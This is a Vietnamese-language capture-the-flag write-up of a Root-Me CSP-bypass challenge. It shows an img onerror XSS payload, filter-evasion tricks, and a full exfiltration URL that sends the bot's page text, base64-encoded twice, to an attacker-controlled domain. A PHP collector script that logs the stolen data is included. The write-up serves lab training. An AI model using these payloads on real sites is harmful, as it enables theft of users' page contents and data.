# CSP Bypass - Inline code

## Solution

Đọc liên kết pdf 'Google - CSP Is Dead, Long Live CSP' trong phần related resources và biết rằng `unsafe-inline` cho phép thực thi các inline script

Vì vậy, thử đặt một số payload XSS bên trong tham số `user`:

Bắt đầu bằng:

```
<script></script>
```

có vẻ như tác giả không cho phép.

Sử dụng thẻ `img` với event `onerror` `<img src="" onerror="alert(1)">` và nhận được XSS

Sau đó cần trích xuất flag, tài liệu cho biết chỉ có bot mới có thể thấy flag nghĩa là có một bot trong máy chủ có thể đọc nội dung của trang bao gồm flag, sau đó bằng cách truy cập trang `/report`, phải gửi form chứa XSS nhưng server lọc một số từ khóa như `http` nên có thể sử dụng `//` thay, và `+` bị escape thành '' nên không thể nối bằng `+` trong Javascript, chỉ sử dụng hàm `concat()`.

Trong payload XSS này, cần đọc nội dung trang nên đã gửi payload này: 

```
http://challenge01.root-me.org/web-client/ch8/page?user=<img src="" onerror="window.location.href='//mydomain.com/index.php?c='.concat(btoa(btoa(document.getElementsByTagName('body')[0].innerText)))">
```

Đầu tiên, đọc văn bản bên trong body sau đó mã hóa hai lần để tránh nhận được ký tự `+` bằng hàm `btoa()` để mã hóa base64 và có một domain nên chỉ cần thêm tệp PHP đọc tham số GET có tham số `c` và lưu vào tệp txt có tên `content.txt`m đó là code bên trong `index.php`

```
<?php
if(isset($_GET['c']))
       file_put_contents('content.txt', date('Y-m-d H:i')." : ".$_GET['c']." \n", FILE_APPEND);
?>
```

Sau khi submit, chỉ cần kiểm tra tệp `content.txt` trong domain (http://mydomain.com/content.txt) và nhận được một số văn bản ở định dạng base64 nên giải mã hai lần và nhận được phần văn bản bên trong chứa flag.
